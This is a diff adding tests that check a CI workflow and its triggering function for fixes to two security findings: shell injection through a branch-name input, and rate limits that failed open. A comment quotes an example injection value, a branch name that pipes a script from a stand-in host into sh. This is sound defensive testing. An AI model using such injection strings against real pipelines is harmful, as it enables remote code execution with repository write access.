@@ -75,6 +75,121 @@ describe('the endpoint that can start work', () => {
   });
 });
 
+/**
+ * **The two findings that were about what an input can reach — KP2-06 and
+ * KP2-07.**
+ *
+ * Both were open across three Keeper reviews, and both are the same species:
+ * a value that arrives from outside is treated as trustworthy at the one point
+ * where it stops being data and becomes instruction. One was the branch name
+ * reaching a shell; the other was a limit that switched itself off when it
+ * could not be checked.
+ */
+describe('nothing an input carries reaches a command', () => {
+  /** Every `run:` block in the workflow, with the line numbers they start at. */
+  const runBlocks = (): { at: number; body: string }[] => {
+    const lines = WORKFLOW.split('\n');
+    const out: { at: number; body: string }[] = [];
+    let indent = -1;
+    let body: string[] = [];
+    let at = 0;
+    for (const [index, line] of lines.entries()) {
+      const opens = /^(\s*)run: \|/.exec(line);
+      if (opens) {
+        if (indent >= 0) out.push({ at, body: body.join('\n') });
+        indent = (opens[1] ?? '').length;
+        body = [];
+        at = index + 1;
+        continue;
+      }
+      if (indent < 0) continue;
+      const isOutdent = line.trim() !== '' && line.length - line.trimStart().length <= indent;
+      if (isOutdent) {
+        out.push({ at, body: body.join('\n') });
+        indent = -1;
+        body = [];
+        continue;
+      }
+      body.push(line);
+    }
+    if (indent >= 0) out.push({ at, body: body.join('\n') });
+    return out;
+  };
+
+  it('has run blocks to check, so this is not passing over an empty list', () => {
+    expect(runBlocks().length).toBeGreaterThan(4);
+  });
+
+  /**
+   * **KP2-06.** `${{ inputs.branch }}` was pasted into three `git push` lines
+   * and into the middle of a `node -e` string literal. A branch named
+   * `x;curl evil.sh|sh` ran a command; one containing a quote closed the JSON
+   * string and wrote its own script, which this workflow then executed holding a
+   * token that can write to the repository.
+   *
+   * The rule is not "sanitise the branch". It is that **no expansion happens in
+   * a command at all**: every value arrives through `env:`, where the runner
+   * puts it in the environment instead of pasting it into the text of a script.
+   */
+  it('expands no workflow expression inside any run block', () => {
+    for (const block of runBlocks()) {
+      expect(
+        block.body,
+        `an expression is expanded in the run block at line ${block.at}`,
+      ).not.toContain('${{');
+    }
+  });
+
+  it('passes the branch through the environment, quoted, wherever it pushes', () => {
+    expect(WORKFLOW).not.toMatch(/git push origin HEAD:\$\{\{/);
+    const pushes = [...WORKFLOW.matchAll(/git push origin (\S+)/g)].map((m) => m[1] ?? '');
+    expect(pushes.length).toBeGreaterThan(2);
+    for (const target of pushes) expect(target).toBe('"HEAD:$TARGET"');
+  });
+
+  /**
+   * The gate that makes the environment variable safe to use even where a shell
+   * would still expand it. An allow-list: what a branch name needs, and no other
+   * byte. The deny-list it replaced named three shapes and let every other one
+   * through, which is the way a deny-list always fails — on the character nobody
+   * listed.
+   */
+  it('admits only branch names it can name the shape of', () => {
+    expect(WORKFLOW).toContain("grep -qE '^[A-Za-z0-9][A-Za-z0-9._/-]{0,199}$'");
+    expect(WORKFLOW).toContain('exit 1');
+    // And still refuses the default branch first, before this or anything else.
+    const refusal = WORKFLOW.indexOf('Refuse the default branch');
+    const checkout = WORKFLOW.indexOf('actions/checkout');
+    expect(refusal).toBeGreaterThan(-1);
+    expect(refusal).toBeLessThan(checkout);
+  });
+
+  /**
+   * **KP2-07.** The runs query answered both limits — one at a time, and the
+   * daily ceiling — and fell to an empty list when it failed. So a GitHub error
+   * or an expired token did not weaken the limits, it removed them, and the
+   * endpoint looked exactly as it does when nothing has run yet.
+   */
+  it('refuses to start work when it cannot read what is already running', () => {
+    expect(FUNCTION).not.toMatch(/workflow_runs\?per_page=100`,\s*token,\s*\)\.catch/);
+    expect(FUNCTION).toContain("throw new Error('the runs query returned no list of runs')");
+    // The refusal, and the status that says "try again" rather than "you are
+    // out of runs" — they are different instructions to the owner.
+    expect(FUNCTION).toContain('so nothing was started');
+    expect(FUNCTION).toContain('503');
+  });
+
+  it('counts both limits from the list it refused to do without', () => {
+    // The guard is only worth having if the limits are still downstream of it.
+    const guard = FUNCTION.indexOf('a limit that cannot be counted has not been met');
+    const inFlight = FUNCTION.indexOf("'A session is already working. One at a time.'");
+    const ceiling = FUNCTION.indexOf('which is the ceiling');
+    expect(guard).toBeGreaterThan(-1);
+    expect(inFlight).toBeGreaterThan(guard);
+    expect(ceiling).toBeGreaterThan(guard);
+  });
+});
+
 describe('the workflow that does the work', () => {
   it('starts only when the owner starts it', () => {
     expect(WORKFLOW).toContain('workflow_dispatch:');
